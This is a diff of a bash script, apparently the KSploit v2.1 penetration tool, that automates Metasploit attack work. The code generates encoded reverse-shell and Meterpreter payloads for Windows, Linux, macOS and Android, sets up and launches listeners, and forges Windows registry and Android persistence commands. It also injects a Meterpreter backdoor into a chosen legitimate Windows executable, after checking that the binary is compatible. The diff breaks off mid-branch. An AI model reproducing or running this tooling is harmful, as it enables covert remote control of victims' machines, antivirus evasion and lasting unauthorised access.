@@ -1,243 +1,12 @@
 #!/bin/bash
 # Script: KSploit v 2.1
-# Author: kaotickj
+# Author: Kaotick Jay
 # Github: https://github.com/kaotickj/KSploit
 # Website: https://kdgwebsolutions.com
 
-#########################################
-#----------------- VARS ----------------#
-#########################################
-ADDR=$(ip addr | grep tun0|grep inet|awk '{print $2}'|cut -d "/" -f 1)
-EADDR=$(ip addr | grep eth0|grep inet|awk '{print $2}'|cut -d "/" -f 1)
-WADDR=$(ip addr | grep wlan0|grep inet|awk '{print $2}'|cut -d "/" -f 1)
-ME="$(whoami) 👽 $(hostname)"
-ME=$(echo $ME | tr '[:lower:]' '[:upper:]')
-wdir=$(pwd)
-THISIP=$(dig @resolver4.opendns.com myip.opendns.com +short -4)
-
-###########################################
-#---------------  Colors  ----------------#
-###########################################
-
-C=$(printf '\033')
-FGR="${C}[48;5;196m"
-RED="${C}[1;31m"
-SED_RED="${C}[1;31m&${C}[0m"
-GREEN="${C}[1;32m"
-FGG="${C}[48;5;22m"
-SED_GREEN="${C}[1;32m&${C}[0m"
-YELLOW="${C}[1;33m"
-SED_YELLOW="${C}[1;33m&${C}[0m"
-SED_RED_YELLOW="${C}[1;31;103m&${C}[0m"
-BLUE="${C}[1;34m"
-FGB="${C}[48;5;34m"
-SED_BLUE="${C}[1;34m&${C}[0m"
-ITALIC_BLUE="${C}[1;34m${C}[3m"
-LIGHT_MAGENTA="${C}[1;95m"
-SED_LIGHT_MAGENTA="${C}[1;95m&${C}[0m"
-LIGHT_CYAN="${C}[1;96m"
-FGC="${C}[48;5;237m"
-SED_LIGHT_CYAN="${C}[1;96m&${C}[0m"
-LG="${C}[1;37m"
-SED_LG="${C}[1;37m&${C}[0m"
-DG="${C}[1;90m"
-SED_DG="${C}[1;90m&${C}[0m"
-NC="${C}[0m"
-UNDERLINED="${C}[5m"
-ITALIC="${C}[3m"
-
-###############################################
-#  LOCAL ADAPTER ADDRESSES
-###############################################
-locals()
-{
-    echo "               ${FGC}| Your current adapter address(es)  |${NC}${YELLOW}"
-    if [ -z "$EADDR" ]  &&  [ -z "$ADDR" ]  &&  [ -z "$WADDR" ];
-      then
-       echo "               ${FGR}|       ⚠️   NOT CONNECTED   ⚠️       |${NC}${YELLOW}"
-    fi
-    if [ -n "${EADDR}" ];
-      then
-       echo "               | ETH0: $EADDR"| sed 's/$/ /g'
-    fi
-    if [ -n "${ADDR}" ]; 
-      then
-       echo "               | TUN0: $ADDR"| sed 's/$/ /g'
-    fi 
-    if [ -n "${WADDR}" ]; 
-      then
-       echo "               | WLAN0: $WADDR"| sed 's/$/ /g'
-    fi
-
-#    echo "               | IPV4: $THISIP"| sed 's/$/ /g'   ## Uncomment this if you want to show your ipv4 public ip address in dialogs
-    echo "               -------------------------------------"
-    return 
-}
-
-###############################################
-# SHOW ERRORS
-###############################################
-errors()
-{
-   if [ ! "${error}" = "" ]
-    then
-     echo "${LG}"
-     echo "            ${FGR}          $error         ${NC}"
-     error="" 
-   fi
-   return 
-}
-
-###############################################
-#  FILE CHOOSER 
-###############################################
-pickfile()
-{
-	local f="$exepath"
-	local m="$0: file $f failed to load."
-	if [ -f $f ] 
-	then
-		m="$0: $f file loaded."
-	else
-		m="$0: $f is not a file."
-		dialog --title "Load file" --clear --msgbox "$m" 10 50
-		goto pick;
-	fi 
-	echo ${NC}
-	dialog --title "Load file" --clear --msgbox "$m" 10 50
-	return
-}
-
-###############################################
-#  EXIT 1
-###############################################
-
-goodbye()
-{
-  echo  "${YELLOW}	  |${FGG}    👋${GREEN}            Goodbye            👋      ${NC}${YELLOW}|"
-  echo
-  echo
-  exit 0;
-}
-
-###############################################
-# EXIT 0
-###############################################
-
-badbye()
-{
-  echo  "${RED}	  |${FGR}💀${LG}            FATAL ERROR!!             💀 ${NC}${RED}|"
-  echo 
-  echo
-  exit 1;
-}
-
-################################################################################
-# Obfuscate Payloads Menu
-################################################################################
-obfuscate() {
-    #encodemenu:
-    clear
-    echo ${YELLOW}
-    echo "	   _____________________________________________"
-    echo "	  |${FGG}     KSploit Obfuscate Payloads Options:     ${NC}${YELLOW}|"
-    echo "	  |---------------------------------------------|"
-    echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Obfuscate Payloads.                 ${YELLOW}|"
-    echo "	  |---------------------------------------------|"
-    echo "	  |    🚪${GREEN} q ${BLUE}Quit to Main Menu.                  ${YELLOW}|"
-    echo "	  |_____________________________________________${YELLOW}|${GREEN}"
-    echo
-    errors
-    echo ${YELLOW}
-    read -n1 -p "     	  What do you want to do? Choose: [1,q] " opt
-
-    case $opt in
-        1)
-            goto encode;
-            ;;
-        q)
-            goto $start
-            ;;
-       *)
-         error="$opt is not a valid option!"
-         goto encodemenu
-        ;;
-    esac
-
-    #encode:
-    echo
-    echo 
-    echo "  ${FGC}${GREEN} Payload Obfuscation ${NC}${YELLOW}"
-    echo "  --------------------"
-    echo
-    echo "  ${GREEN} I need to collect some input for the payload parameters"${NC}    
-    echo
-    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
-    
-    # Get the parameters for the payload
-    #params:
-    echo ${YELLOW}
-    read -p "  Enter the payload to obfuscate: " payload
-    read -p "  Enter the output format (e.g., exe, elf, apk): " format
-    read -p "  Enter the output file name: " output
-    read -p "  Enter the LHOST for the payload: " lhost
-    read -p "  Enter the LPORT for the payload: " lport
-    
-    echo
-    echo "  Please wait while I validate your input parameters and get available encoders ..." | fmt -w 60
-    echo
-
-    # Check if the payload is valid
-    if ! msfvenom -l payloads | grep -q $payload; then
-        echo "  Error: Invalid payload."
-        goto params
-    fi
-
-    # Check if the format is valid
-    if ! msfvenom -l formats | grep -q $format; then
-        echo "  Error: Invalid format."
-        goto params
-    fi
-
-    # Display available encoders
-	#encoders:
-    echo "  ${FGC}Available Encoders:${NC}${YELLOW}"
-    msfvenom -l encoders | grep -E '^\s+' | sed 's/^\s*//'
-
-    read -p "  Enter the encoder to use (e.g., x86/xor, press Enter to skip): " encoder
-
-    # Check if the encoder is valid
-    if [ ! -z "$encoder" ] && ! msfvenom -l encoders | grep -q $encoder; then
-        echo "Error: Invalid encoder."
-        goto encoders
-    fi
-
-    read -p "  Enter the number of iterations of $encoder to use: " iterations
-
-    # Modify the payload with garbage code
-    # echo "  Generating garbage code and concatenating to payload"
-    # garbage_code=$(openssl rand -hex 32)
-    # modified_payload="${payload}${garbage_code}"
-
-    # Generate the obfuscated payload
-    echo "  Generating obfuscated payload..."
-    if [ -z "$encoder" ]; then
-        msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -o $output.$format >/dev/null 2>&1
-    else
-        msfvenom -p $payload LHOST=$lhost LPORT=$lport -e $encoder -i $iterations -f $format -o $output.$format
-        echo 
-    fi
-
-    if [ $? -eq 0 ]; then
-        echo "  Obfuscated payload saved to: $output.$format"
-        pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
-        goto encodemenu;
-    else
-        echo "  Error: Failed to obfuscate payload."
-        pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
-        goto encodemenu;
-    fi
-}
+# Include Modularized Scripts
+source functions.sh
+# source ./modules/post_exploit.sh
 
 ################################################################################
 # Payloads Menu
@@ -252,9 +21,15 @@ payloads()
   |  __/ (_| | |_| | | (_) | (_| | (_| \__ \
   |_|   \__,_|\__, |_|\___/ \__,_|\__,_|___/
 	      |___/                         
-   💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰💰	    
- '${LIGHT_MAGENTA} 
-   echo "  Use the payloads menu to quickly and easily craft metasploit payloads for a wide variety of targets." |fmt -w 60
+ '${FGC}${YELLOW}
+	for i in {1..21}; do
+		echo -ne "   $(printf '💰%.0s' $(seq 1 $i))\r"
+		sleep .1
+	done
+	echo -ne '                 Built to run. Born to exploit.\n'
+	sleep .5
+ 
+   echo "${NC}${LIGHT_MAGENTA}  Use the payloads menu to quickly and easily craft metasploit payloads for a wide variety of targets." |fmt -w 60
    echo
    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
    #pay:
@@ -292,8 +67,7 @@ payloads()
 	3)
           echo
           echo "          ${FGC}   Crafting a Mac OSX Reverse TCP Payload :   ${NC}${YELLOW}"
-	  read -p '	    Set Attacker IP* ' attackerip
-    	  read -p '	    Set Attacker Port* ' attackerport
+	  prompt_ip_port
 	  echo "	    💰💰💰 Generating mac osx payload ..."	
 	  msfvenom -p osx/x86/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport -f macho > $wdir/shell.macho
 	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.macho saved   💰💰💰   ${NC}${GREEN}"
@@ -303,25 +77,13 @@ payloads()
 	4)
           echo
           echo "          ${FGC}  Crafting an Android Meterpreter Payload :   ${NC}${YELLOW}"
-	  read -p '	    Set Attacker IP* ' attackerip
-    	  read -p '	    Set Attacker Port* ' attackerport
+	  prompt_ip_port
 	  echo "	    💰💰💰 Generating android meterpreter payload ..."	
-	  msfvenom -p android/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R > $wdr/shell.apk
+	  msfvenom -p android/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R > $wdir/shell.apk
 	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.apk saved   💰💰💰   ${NC}${GREEN}"
           pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
           goto pay;
 	;;  
-	#5)
-	  #echo
-          #echo "         ${FGC}    Crafting a Reverse Python Payload  :   ${NC}${YELLOW}"
-	  #read -p '	    Set Attacker IP* ' attackerip
-    	  #read -p '	    Set Attacker Port* ' attackerport
-	  #echo "	    💰💰💰 Generating reverse python payload ..."	
-	  #msfvenom -p cmd/unix/reverse_python LHOST=$attackerip LPORT=$attackerport -f raw > $wdir/shell.py
-	  #echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.py saved   💰💰💰   ${NC}${GREEN}"
-          #pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
-          #goto pay;
-	#;;
         q)
           clear
           goto $start
@@ -363,8 +125,7 @@ linpayloads()
 	1)
 	  echo 
           echo "  ${FGC}    Crafting a Linux x86 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
-	  read -p '	    Set Attacker IP* ' attackerip
-    	  read -p '	    Set Attacker Port* ' attackerport
+	  prompt_ip_port
 	  echo "	    💰💰💰 Generating linux x86 meterpreter payload ..."	
 	  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > $wdir/shell.elf
 	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.elf saved   💰💰💰   ${NC}${GREEN}"
@@ -374,8 +135,7 @@ linpayloads()
 	2)
 	  echo 
           echo "  ${FGC}    Crafting a Linux x64 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
-	  read -p '	    Set Attacker IP* ' attackerip
-    	  read -p '	    Set Attacker Port* ' attackerport
+	  prompt_ip_port
 	  echo "	    💰💰💰 Generating linux x64 meterpreter payload ..."	
 	  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > $wdir/shell64.elf
 	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell64.elf saved   💰💰💰   ${NC}${GREEN}"
@@ -423,8 +183,7 @@ winpayloads()
 	1)
 	  echo 
 	  echo "  ${FGC}    Crafting a Windows x86 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
-	  read -p '	    Set Attacker IP* ' attackerip
-    	  read -p '	    Set Attacker Port* ' attackerport
+    	  prompt_ip_port
 	  echo "	    💰💰💰 Generating shikata ga nai encoded payload ..."	
 	  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x86/shikata_ga_nai -i 10 -f exe > $wdir/shell.exe
 	  echo
@@ -435,8 +194,7 @@ winpayloads()
 	2)
 	  echo 
 	  echo "  ${FGC}    Crafting a Windows x64 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
-	  read -p '	    Set Attacker IP* ' attackerip
-    	  read -p '	    Set Attacker Port* ' attackerport
+    	  prompt_ip_port
 	  echo "	    💰💰💰 Generating xor encoded payload ..."	
 	  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x64/xor -i 10 -f exe > $wdir/shell64.exe
 	  echo
@@ -468,9 +226,14 @@ listeners()
   | |   | / __| __/ _ \\ '_ \\ / _ \\ '__/ __|
   | |___| \__ \ ||  __/ | | |  __/ |  \__ \
   |_____|_|___/\__\___|_| |_|\___|_|  |___/
-   👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂👂
-'${LIGHT_MAGENTA}
-   echo "  Use the listeners menu to craft and quickly deploy metasploit listeners." |fmt -w 60
+'${FGC}${YELLOW}
+	for i in {1..21}; do
+		echo -ne "   $(printf '👂%.0s' $(seq 1 $i))\r"
+		sleep .1
+	done
+	echo -ne '                 Can you hear me now? Good!\n'
+	sleep .5
+   echo "${NC}${LIGHT_MAGENTA}  Use the listeners menu to craft and quickly deploy metasploit listeners." |fmt -w 60
    echo
    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
    #listen:
@@ -503,9 +266,8 @@ listeners()
             echo "    ${FGC}  Crafting a Windows Meterpreter Reverse TCP Listener :    ${NC}${YELLOW}"
             echo use multi/handler > $wdir/meterpreter_windows.rc
             echo set PAYLOAD windows/x64/meterpreter/reverse_tcp >> $wdir/meterpreter_windows.rc
-            read -p '	    Set Attacker IP* ' attackerip
+            prompt_ip_port
             echo set LHOST $attackerip >> $wdir/meterpreter_windows.rc
-            read -p '	    Set Attacker Port* ' attackerport
             echo set LPORT $attackerport >> $wdir/meterpreter_windows.rc
             echo run >> $wdir/meterpreter_windows.rc
             echo
@@ -514,7 +276,7 @@ listeners()
 	    sleep 1
 	    echo
 	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
-            cat $wdir/meterpreter_windows.rc | xterm -e msfconsole -r $wdir/meterpreter_windows.rc 
+            launch_msfconsole "$wdir/meterpreter_windows.rc"
 	    sleep 2
             goto listen;
             ;;
@@ -524,9 +286,8 @@ listeners()
             echo "    ${FGC}    Crafting a Linux Meterpreter Reverse TCP Listener :     ${NC}${YELLOW}"
             echo use exploit/multi/handler > $wdir/meterpreter_linux.rc
             echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> $wdir/meterpreter_linux.rc
-	    read -p '	    Set Attacker IP* ' attackerip
+            prompt_ip_port
             echo set LHOST $attackerip >> $wdir/meterpreter_linux.rc
-            read -p '	    Set Attacker Port* ' attackerport
             echo set LPORT $attackerport >> $wdir/meterpreter_linux.rc
             echo run >> $wdir/meterpreter_linux.rc
             echo
@@ -535,7 +296,7 @@ listeners()
 	    sleep 1
 	    echo
 	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
-            cat $wdir/meterpreter_linux.rc | xterm -e msfconsole -r $wdir/meterpreter_linux.rc
+            launch_msfconsole "$wdir/meterpreter_linux.rc"
 	    sleep 2
             goto listen;
             ;;
@@ -545,9 +306,8 @@ listeners()
             echo "          ${FGC}    Crafting an OSX Reverse TCP Listener :     ${NC}${YELLOW}"
             echo use exploit/multi/handler > $wdir/meterpreter_mac.rc
             echo set PAYLOAD osx/x86/shell_reverse_tcp >> $wdir/meterpreter_mac.rc
-	    read -p '	    Set Attacker IP* ' attackerip
+	    prompt_ip_port
             echo set LHOST $attackerip >> $wdir/meterpreter_mac.rc
-            read -p '	    Set Attacker Port* ' attackerport
             echo set LPORT $attackerport >> $wdir/meterpreter_mac.rc
             echo run >> $wdir/meterpreter_mac.rc
             echo
@@ -556,7 +316,7 @@ listeners()
 	    sleep 1
 	    echo
 	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
-            cat $wdir/meterpreter_mac.rc | xterm -e msfconsole -r $wdir/meterpreter_mac.rc 
+            launch_msfconsole "$wdir/meterpreter_mac.rc" 
 	    sleep 2
             goto listen;
             ;;
@@ -566,9 +326,8 @@ listeners()
             echo "         ${FGC}     Crafting a Android Reverse TCP Listener :     ${NC}${YELLOW}"
             echo use exploit/multi/handler > $wdir/meterpreter_droid.rc
             echo set PAYLOAD android/meterpreter/reverse_tcp >> $wdir/meterpreter_droid.rc
-	    read -p '	    Set Attacker IP* ' attackerip
+            prompt_ip_port
             echo set LHOST $attackerip >> $wdir/meterpreter_droid.rc
-            read -p '	    Set Attacker Port* ' attackerport
             echo set LPORT $attackerport >> $wdir/meterpreter_droid.rc
             echo run >> $wdir/meterpreter_droid.rc
 	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_droid.rc."
@@ -576,7 +335,7 @@ listeners()
 	    sleep 1
 	    echo
 	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
-            cat $wdir/meterpreter_droid.rc | xterm -e msfconsole -r $wdir/meterpreter_droid.rc 
+            launch_msfconsole "$wdir/meterpreter_droid.rc" 
 	    sleep 2
             goto listen;
             ;;  
@@ -615,9 +374,14 @@ persist() {
     echo "  |  _ \ ___ _ __ ___(_)___| |_ ___ _ __   ___ ___ "
     echo "  | |_) / _ \ '__/ __| / __| __/ _ \ '_ \ / __/ _ \\${GREEN}"
     echo "  |  __/  __/ |  \__ \ \__ \ ||  __/ | | | (_|  __/${LIGHT_MAGENTA}"
-    echo "  |_|   \___|_|  |___/_|___/\__\___|_| |_|\___\___|"
-    echo "  ⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛⌛"
-    echo ${LIGHT_MAGENTA}
+    echo "  |_|   \___|_|  |___/_|___/\__\___|_| |_|\___\___|"${FGC}${YELLOW}
+	for i in {1..21}; do
+		echo -ne "   $(printf '⌛%.0s' $(seq 1 $i))\r"
+		sleep .1
+	done
+	echo -ne '                 Stay awhile - and listen \n'
+	sleep .5
+    echo ${NC}${LIGHT_MAGENTA}
     echo "  Use the persistence menu to quickly forge persistence scripts. Currently supports windows and android scripts." | fmt -w 60
     echo
     pause '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
@@ -627,7 +391,7 @@ persist() {
     echo "      _____________________________________________"
     echo "     |${FGG}       KSploit Persistence Menu Options:     ${NC}${YELLOW}|"
     echo "     |---------------------------------------------|"
-    echo "     |    🖥️ ${GREEN} 1 ${BLUE}Windows Persitence Script.          ${YELLOW}|"
+    echo "     |    🖥️ ${GREEN} 1 ${BLUE}Windows Persistence Script.         ${YELLOW}|"
     echo "     |---------------------------------------------|"
     echo "     |    🤖${GREEN} 2 ${BLUE}Android Persistence Script.         ${YELLOW}|"
     echo "     |---------------------------------------------|"
@@ -644,17 +408,38 @@ persist() {
         1)
             echo "          ${FGC}    Forging a Windows x64 Persistence Script:${NC}${YELLOW}"
             echo
-            read -p '        Set Attacker IP: ' attackerip
-            read -p '        Set Attacker Port: ' attackerport
+            prompt_ip_port
             read -p '        Set Session ID: ' session
             echo
-            echo "  Once you have a connection, and have the meterpreter prompt, type (or copy/paste):" | fmt -w 60
+            echo "  📌 After you get a Meterpreter session, background it by typing:" | fmt -w 60
+            echo "     ${FGC}${LIGHT_CYAN} background ${NC}${YELLOW}"
             echo
-            echo "  ${FGC}${LIGHT_CYAN} run exploit/windows/local/registry_persistence LHOST=$attackerip LPORT=$attackerport SESSION=$session ${NC}${YELLOW}"
+            echo "  Then, from the msfconsole prompt, run:" | fmt -w 60
             echo
-            echo "  *** In older msfconsole versions, instead type (or copy/paste)" | fmt -w 60
+            echo "     ${FGC}${LIGHT_CYAN} use exploit/windows/local/registry_persistence"
+            echo "     set SESSION $session"
+            echo "     set LHOST $attackerip"
+            echo "     set LPORT $attackerport"
+            echo "     run ${NC}${YELLOW}"
             echo
-            echo "  ${FGC}${LIGHT_CYAN} run persistence -x -i 20 -r $attackerip -p $attackerport ${NC}${YELLOW}"
+            persist_cmd="use exploit/windows/local/registry_persistence; set SESSION $session; set LHOST $attackerip; set LPORT $attackerport; run"
+
+            # Clipboard support
+            if command -v xclip >/dev/null 2>&1; then
+                printf "%s" "$persist_cmd" | xclip -selection clipboard
+                echo "     📋 Commands copied to clipboard (via xclip)."
+            elif command -v xsel >/dev/null 2>&1; then
+                printf "%s" "$persist_cmd" | xsel --clipboard
+                echo "     📋 Commands copied to clipboard (via xsel)."
+            elif command -v wl-copy >/dev/null 2>&1; then
+                printf "%s" "$persist_cmd" | wl-copy
+                echo "     📋 Commands copied to clipboard (via wl-copy)."
+            elif command -v pbcopy >/dev/null 2>&1; then
+                printf "%s" "$persist_cmd" | pbcopy
+                echo "     📋 Commands copied to clipboard (via pbcopy)."
+            else
+                echo "     ⚠️ Clipboard copy not available. Manually copy the commands above."
+            fi
             echo
             pause '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
             goto stay
@@ -667,10 +452,11 @@ persist() {
             echo "do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity" >> $wdir/android.sh
             echo "sleep 20" >> $wdir/android.sh
             echo "done" >> $wdir/android.sh
+            chmod +x $wdir/android.sh
             sleep 2
             echo 
             echo -e "          ⌛⌛⌛ Your Persistence Script saved to $wdir/android.sh "
-            echo -e "                Upload it to / ontarget android device${NC}"
+            echo -e "                Upload it to / on target android device${NC}"
             echo 
             pause '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
             goto stay
@@ -691,110 +477,110 @@ persist() {
 ################################################################################
 malexe()
 {
-   echo
-	clear 
-	errors
-	echo
-	echo 
-	echo -e "          ${BLUE}  -------------------------------------------------------------"
-	echo -e "           | ${FGC}${LIGHT_CYAN}   💉💉💉  Windows Executable Payload Injection  💉💉💉    ${NC}${BLUE} |" 
-	echo -e "            -------------------------------------------------------------${LIGHT_CYAN}"
-	echo
-	echo "             ${FGC}${LIGHT_CYAN}     Injecting a Windows Executable :     ${NC}${LIGHT_CYAN}"
-	echo
-	locals
-	echo ${LIGHT_CYAN}
-	read -p '   	       Set Attacker IP* ' attackerip
-	read -p '   	       Set Attacker Port* ' attackerport
-	echo -e "               💉💉💉💉💉💉💉💉💉💉💉💉💉"  
-	#pick:
-	echo ${LIGHT_CYAN}
-        if command -v dialog > /dev/null;
-	   then
-		exepath=$(dialog --title "Load file" --stdout --title "Please choose a windows exe to inject" --fselect $wdir/ 14 48)
-		# load file
-		[ ! -z $exepath ] && pickfile "$exepath"
-		#return from dialog
-		echo
-		clear 
-		errors
-		echo
-		echo 
-		echo -e "          ${BLUE}  -------------------------------------------------------------"
-		echo -e "           | ${FGC}${LIGHT_CYAN}   💉💉💉  Windows Executable Payload Injection  💉💉💉    ${NC}${BLUE} |" 
-		echo -e "            -------------------------------------------------------------${LIGHT_CYAN}"
-		echo
-		echo "             ${FGC}${LIGHT_CYAN}     Injecting a Windows Executable :     ${NC}${LIGHT_CYAN}"
-		echo
-		locals
-		echo ${LIGHT_CYAN}
-		echo "   	       Loaded: $exepath"
-	   else
-	      echo -e "   	      ${FGC} ⚠️   Consider:  (sudo apt-get install dialog)  ${NC}${LIGHT_CYAN}"
-	      echo	
-	      read -p '   	       Path to exe for injection*' exepath
-        fi
+    echo
+    clear 
+    errors
+    echo
+    echo 
+    echo -e "          ${BLUE}  -------------------------------------------------------------"
+    echo -e "           | ${FGC}${LIGHT_CYAN}   💉💉💉  Windows Executable Payload Injection  💉💉💉    ${NC}${BLUE} |" 
+    echo -e "            -------------------------------------------------------------${LIGHT_CYAN}"
+    echo
+    echo "             ${FGC}${LIGHT_CYAN}     Injecting a Windows Executable :     ${NC}${LIGHT_CYAN}"
+    echo
+    locals
+    echo ${LIGHT_CYAN}
+    prompt_ip_port
+    echo -e "               💉💉💉💉💉💉💉💉💉💉💉💉💉"  
+    echo ${LIGHT_CYAN}
 
-	read -p '   	       Output filename*' outputname
-	echo 
-	echo -e "               💉💉💉 Injecting payload into $outputname ..."
-#	echo $exepath
-	echo `msfvenom --platform windows -x $exepath -k -p windows/x64/meterpreter/reverse_tcp  lhost=$attackerip lport=$attackerport -b "\x00" -e x64/xor -i 39 -f exe -o $wdir/$outputname`
-	if [ -f "${outputname}" ]
-	then
-	echo -ne '           💉\r'
-	sleep .1
-	echo -ne '           💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
-	sleep .1
-	echo -ne '           💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉💉\r'
-	echo -ne "         ${FGG}${YELLOW} 💉💉💉 $wdir/$outputname saved 💉💉💉   ${NC}${LIGHT_CYAN}"'\r' 
-	chmod 777 $wdir/$ouputname
-	echo
-	echo
-	pause  '           '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
-	else 
-	   echo "${RED}ERROR............"	
-	pause  '           '${FGR}${YELLOW}' Press [Enter] key to continue...'${NC}
-	fi   
-	goto start;
-  exit 1; 
+    if command -v dialog > /dev/null; then
+        exepath=$(dialog --title "Load file" --stdout --title "Please choose a windows exe to inject" --fselect "$wdir/" 14 48)
+        [ -n "$exepath" ] && pickfile "$exepath"
+        echo
+        clear 
+        errors
+        echo
+        echo 
+        echo -e "          ${BLUE}  -------------------------------------------------------------"
+        echo -e "           | ${FGC}${LIGHT_CYAN}   💉💉💉  Windows Executable Payload Injection  💉💉💉    ${NC}${BLUE} |" 
+        echo -e "            -------------------------------------------------------------${LIGHT_CYAN}"
+        echo
+        echo "             ${FGC}${LIGHT_CYAN}     Injecting a Windows Executable :     ${NC}${LIGHT_CYAN}"
+        echo
+        locals
+        echo ${LIGHT_CYAN}
+        echo "   	       Loaded: $exepath"
+    else
+        echo -e "   	      ${FGC} ⚠️   Consider:  (sudo apt-get install dialog)  ${NC}${LIGHT_CYAN}"
+        echo	
+        read -p '   	       Path to exe for injection* ' exepath
+    fi
 
+    # Compatibility Pre-checks
+    echo -e "\n${FGC}${YELLOW} 🧪 Scanning binary for compatibility...${NC}"
+    fileinfo=$(file "$exepath")
+
+    if ! echo "$fileinfo" | grep -qE "PE32"; then
+        echo -e "${FGR}${RED} ✖ Error: Not a PE32/PE32+ Windows binary.${NC}"
+        pause '           '${FGR}${YELLOW}' Press [Enter] key to continue...'${NC}
+        goto start;
+    fi
+
+    if echo "$fileinfo" | grep -qi "Mono" || strings "$exepath" | grep -q "mscoree.dll"; then
+        echo -e "${FGR}${RED} ✖ Error: .NET/Managed executable detected — not compatible.${NC}"
+        pause '           '${FGR}${YELLOW}' Press [Enter] key to continue...'${NC}
+        goto start;
+    fi
+
+    if upx -qt "$exepath" 2>/dev/null; then
+        echo -e "${FGR}${RED} ✖ Error: UPX-packed executable detected. Please unpack it first.${NC}"
+        pause '           '${FGR}${YELLOW}' Press [Enter] key to continue...'${NC}
+        goto start;
+    fi
+
+    if echo "$fileinfo" | grep -q "PE32+ executable"; then
+        binarch="x64"
+    else
+        binarch="x86"
+    fi
+
+    echo -e "${FGC}${GREEN} ✔ Binary appears clean. Architecture: $binarch${NC}"
+
+    # Set payload/encoder
+    if [[ "$binarch" == "x64" ]]; then
+        PAYLOAD="windows/x64/meterpreter/reverse_tcp"
+        ENCODER="x64/xor"
+    else
+        PAYLOAD="windows/meterpreter/reverse_tcp"
+        ENCODER="x86/shikata_ga_nai"
+    fi
+
+    read -p '   	       Output filename* ' outputname
+    outputpath="$wdir/$outputname"
+    echo 
+    echo -e "               💉💉💉 Injecting payload into $outputpath ..."
+
+    # Execute payload injection
+    msfvenom --platform windows -x "$exepath" -k -p "$PAYLOAD" lhost="$attackerip" lport="$attackerport" -f exe -o "$outputpath"
+
+    # 💉 Animated Success Banner
+    if [ -f "$outputpath" ]; then
+        for i in {1..21}; do
+            echo -ne "           $(printf '💉%.0s' $(seq 1 $i))\r"
+            sleep .1
+        done
+        echo -e "         ${FGG}${YELLOW} 💉💉💉 $outputpath saved 💉💉💉   ${NC}${LIGHT_CYAN}"'\r'
+        echo
+        echo
+        pause  '           '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+    else 
+        echo -e "${FGR}${RED} ✖ Payload generation failed. File not created.${NC}"
